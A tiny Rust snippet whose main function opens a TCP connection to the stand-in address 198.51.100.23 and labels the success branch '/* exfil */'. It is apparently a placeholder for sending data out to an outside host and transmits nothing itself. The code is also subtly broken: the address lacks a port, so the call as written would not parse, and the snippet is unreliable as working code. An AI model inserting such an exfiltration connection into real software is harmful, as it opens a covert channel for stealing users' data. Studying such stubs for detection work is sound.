use std::net::TcpStream;
fn main() {
    if let Ok(_s) = TcpStream::connect("198.51.100.23") { /* exfil */ }
}
